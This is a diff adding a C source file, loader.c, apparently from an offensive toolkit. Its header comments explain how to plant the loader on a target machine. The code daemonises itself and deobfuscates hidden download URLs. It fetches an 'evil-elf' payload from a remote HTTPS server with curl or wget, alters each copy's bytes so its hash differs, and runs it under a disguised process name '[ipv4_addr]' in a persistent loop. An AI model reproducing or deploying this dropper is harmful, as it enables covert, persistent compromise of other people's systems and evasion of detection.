@@ -1,0 +1,342 @@
+/**
+ * Copyright (c) 2020-2021 aplyc1a <aplyc1a@protonmail.com>
+ * 
+ * How to start:
+ * step 1: Run the https-server in the public network.
+ *         You can get a speacial httpserver here: https://github.com/aplyc1a/toolkits/blob/master/0x0F 辅助脚本/MyHTTPSServer.py
+ * step 2: gcc loader.c -lpthread -o loader
+ * 
+ * step 3: Upload the `loader` into the target. You can run the loader as a linux self-starting service.
+ *         Once the loader runs, it will download evil-elf <obfuscator.c:r_file> from https-server and run the elf automatically.
+ **/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/param.h>
+#include <fcntl.h>
+#include <stdint.h>
+
+//////////////////stub/////////////////////
+
+void d3obfu3c4t0r(uint8_t *data, int len)
+{
+    for (int i = 0; i < len; i++) {
+        data[i] = shiftme(data[i], -1);
+    }
+}
+
+uint8_t shiftme(uint8_t value, int8_t n)
+{
+    uint8_t z;
+    if (n > 0 && n < 8)
+    {
+        z = (value >> (8 - n)) | (value << n);    /*循环左移的实现过程*/
+    }
+    else if (n > -8 && n < 0)
+    {
+        n = -n;
+        z = (value << (8 - n)) | (value >> n);  /*循环右移的实现过程*/
+    }
+    return z;
+}
+
+void init_daemon(void) 
+{   
+    int pid;
+    int i;
+
+    if(pid=fork()) {
+        exit(0);
+    }else if(pid< 0) {
+        exit(1);
+    }
+    setsid();
+    if(pid=fork()) {
+        exit(0);
+    }else if(pid< 0) {
+        exit(1);
+    }
+    for(i=0;i< NOFILE;++i) {
+        close(i);
+    }
+    chdir("/tmp");
+    umask(0);
+    return;
+}
+
+void get_rdmstr(uint8_t *arr_space, int length)
+{
+    uint8_t uint8_tset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+    srand(time(NULL));
+    for (int i = 0; i < length - 1; i++){
+        arr_space[i] = uint8_tset[rand() % 52]; 
+    }
+    arr_space[length - 1] = '\0';
+}
+
+int check_file(uint8_t *filename)
+{
+    uint8_t file_headers[20]={0};//guess file type
+    uint8_t c;
+    FILE *fp;
+    int count=0;
+
+    fp = fopen(filename,"r");
+    if(fp == NULL){
+        return 1;
+    }
+    while((!feof(fp))&&count<=10){
+        fread(&c, 1, 1, fp);
+        file_headers[count]=c;
+        count++;
+    }
+    printf("[debug] file_hdr : %x %x %x %x.",file_headers[0],file_headers[1],file_headers[2],file_headers[3]);
+    if(!memcmp(file_headers,"#!/",3)) {
+        printf("<script>\n"); //printf("[debug]
+        return 0;
+    }
+    if(!memcmp(file_headers,"\x7f\x45\x4c\x46",4)){
+        printf("<elf>\n");//printf("[debug]
+        return 0;
+    }
+    
+    uint8_t command[200]={0};
+    sprintf(command, "rm -rf %s", filename);
+    printf("[debug] file content exception,deleting!\n");
+    printf("[debug] command: %s\n",command);
+    
+    fp=popen(command,"r");
+    pclose(fp);    
+    
+    return 1;
+}
+
+void download_file(uint8_t *remote_filename,uint8_t *new_filename)
+{
+    uint8_t command[200];
+    FILE *fp_cmd;
+    int query_times=1;
+
+    if (access("/usr/bin/curl", 1)==0){
+        sprintf(command,"%s%s%s`arch`/%s -o %s", curl_https, base_site, misc_path, remote_filename, new_filename);
+    } else if (access("/usr/bin/wget", 1)==0){
+        sprintf(command,"%s%s%s`arch`/%s -O %s", wget_https, base_site, misc_path, remote_filename, new_filename);
+    } else {
+        printf("[debug] command \"wget\" or \"curl\" not dound.\n");
+        exit(1);
+    }
+    
+    while(1){
+        printf("[debug] ... downloading <%d>...\n", query_times);
+        printf("[debug] %s\n",command);
+        fp_cmd=popen(command,"r");
+        pclose(fp_cmd);
+        printf("[debug] ... checking ...\n");
+        if(!check_file(new_filename)) break;
+        printf("[debug] \n");
+        query_times++;
+        if(query_times>=4) {
+            printf("[debug] too many queries <%d>. Maybe you should check the network connection\n",query_times-1);
+            exit(1);
+        }
+    }
+    printf("[debug] ... finished!\n\n");
+}
+
+int copy_filex(uint8_t *from, uint8_t *to)
+{
+    FILE *fp1=NULL;
+    FILE *fp2=NULL;
+    uint8_t c;
+    fp1 = fopen(from, "rb");
+    fp2 = fopen(to, "wb");
+    if (fp1 == NULL) {
+        printf("[debug] file %s not found.\n",from);
+        return 1;
+    }
+
+    printf("[debug] %s ---> %s\n",from,to);
+    while(!feof(fp1)){
+        fread(&c, 1, 1, fp1);
+        fwrite(&c, 1, 1, fp2);
+    }
+
+    fclose(fp1);
+    fclose(fp2);
+    fp1 = NULL;
+    fp2 = NULL;
+    
+    return 0;
+}
+
+int copy_file(uint8_t *from, uint8_t *to)
+{
+    FILE *fp1=NULL;
+    FILE *fp2=NULL;
+    uint8_t c;
+    long int length = 0;
+    long int i = 0;
+    long int c_count = 0;
+    uint8_t fix_stub[8] = {0};
+    
+    fp1 = fopen(from, "rb");
+    fp2 = fopen(to, "wb");
+    if (fp1 == NULL) {
+        printf("[debug] file %s not found.\n",from);
+        return 1;
+    }
+
+    printf("[debug] %s ---> %s\n", from, to);
+    while(!feof(fp1)){
+        fread(&c, 1, 1, fp1);
+        length++;
+    }
+    length = length - 1;
+    printf("[debug] %s length:%ld\n",from,length);
+    uint8_t *ptr = (uint8_t *)malloc(length);
+    rewind(fp1);
+    while(!feof(fp1)){
+        fread(&c, 1, 1, fp1);
+        ptr[i]=c;
+        i++;
+    }
+    printf("[debug] done\n");
+    rewind(fp1);
+    i=0;
+    // 下面这一段是替换原文件的stub字段，进而确保副本文件的散列值与原文件不一样。
+    while(!feof(fp1)){
+        // char a[15]="<!REPLACE_ME!>";
+        if ( (ptr[i]=='<')&& (ptr[i+1]=='!') && (ptr[i+2]=='R') && (ptr[i+3]=='E')) {
+            get_rdmstr(fix_stub,sizeof(fix_stub)-1);
+            memcpy(ptr+i,fix_stub,strlen(fix_stub));
+            break;
+        }
+        i++;
+    }
+    i=0;
+    while(i<=length){
+        fwrite(ptr+i, 1, 1, fp2);
+        i++;
+    }
+    
+    fclose(fp1);
+    fclose(fp2);
+    fp1 = NULL;
+    fp2 = NULL;
+    free(ptr);
+    return 0;
+}
+
+int check_process(uint8_t *proc_name)
+{
+    uint8_t command[200]={0};
+    uint8_t buffer[100]={0};
+    
+    sprintf(command, "ps aux|grep \"\\%s\"|grep -v \"grep\"|wc -l", proc_name);
+    printf("[debug] command=%s\n",command);
+    FILE *fp=popen(command,"r");
+    fgets(buffer, sizeof(buffer), fp);
+    printf("[debug] received check_proc status:%c \n",buffer[0]);
+    pclose(fp);
+    if(buffer[0]=='0'){
+        return 1;
+    }
+    
+    return 0;
+}
+
+void run_elf(uint8_t *filename, char *fake_argv[], char *envp[])
+{
+
+    uint8_t command[200] = {0};
+    uint8_t buffer[100] = {0};
+    
+    sprintf(command, "chmod +x %s", filename);
+    printf("[debug] command=%s\n",command);
+    FILE *fp_cmd=popen(command,"r");
+    pclose(fp_cmd);
+    
+    int fp = open(filename,O_RDONLY);
+    fexecve(fp, fake_argv, envp);
+    
+}
+
+int main(int agrc,char *argv[],char *envp[])
+{
+    uint8_t dynamic_str[11]={0};
+    uint8_t dynamic_name[100]={0};
+    char *fake_argv[] = {"[ipv4_addr]", NULL, NULL};
+
+    d3obfu3c4t0r(wget_https,sizeof(wget_https));
+    d3obfu3c4t0r(curl_https,sizeof(curl_https));
+    d3obfu3c4t0r(base_site,sizeof(base_site));
+    d3obfu3c4t0r(misc_path,sizeof(misc_path));
+    d3obfu3c4t0r(r_file,sizeof(r_file));
+    d3obfu3c4t0r(l_file,sizeof(l_file));
+
+    int sleep_time=10;
+    
+    FILE *fp1=NULL;
+    int fp2=0;
+    init_daemon();
+    int pid=0;
+    while(1)  
+    {
+        printf("[debug] --------------------------------------------------------\n");
+
+        // 判断本地又没有已经下好母体文件？不在就下载之。
+        printf("[debug] checking if the master file exist...:");
+        fp1 = fopen(l_file,"r");
+        if (fp1 == NULL) {
+            printf(" <no>\n");//printf("[debug]
+            download_file(r_file,l_file);
+        }else{
+            printf(" <yes>\n");//printf("[debug]
+            pclose(fp1);
+            fp1 = NULL;
+        }
+
+        printf("[debug] ... sleeping ...\n\n");
+        sleep(sleep_time);
+        printf("[debug] waked up...\n");
+                
+        // 若刚启动，则先创建一个副本。
+        if (!strcmp(dynamic_str,"")) {
+            // 生成n位随机字母串，这个串将被用于当作副本的名称
+            printf("[debug] generating the dynamic filename...\n");
+            get_rdmstr(dynamic_str,sizeof(dynamic_str));
+            printf("[debug] creating the master file's copy <%s>.\n",dynamic_str);
+            
+            // 拼接出随机文件的绝对路径
+            uint8_t *p=l_file;
+            int cursor=0,count=0;
+            while(*p!='\0'){
+                if(*p=='/') cursor=count; 
+                p++;
+                count++;
+            }
+            strcpy(dynamic_name,l_file);
+            strcpy(dynamic_name+cursor+1,dynamic_str);
+            
+            // dynamic_name是这个副本的绝对路径，下面的函数用于复制文件。
+            if(copy_file(l_file,dynamic_name)) continue;
+        }
+        // 检查副本的进程，若不存在则启动副本，反之，进入睡眠状态。
+        printf("[debug] checking if the hiden process existed.\n");
+        if(check_process(fake_argv[0])){
+            printf("[debug] ok. run the copy.\n");
+            setsid();
+            if (fork()==0){
+                run_elf(dynamic_name, fake_argv, envp);
+            } else {
+                exit(0);
+            }
+        }
+
+    }
+    return 0;
+}
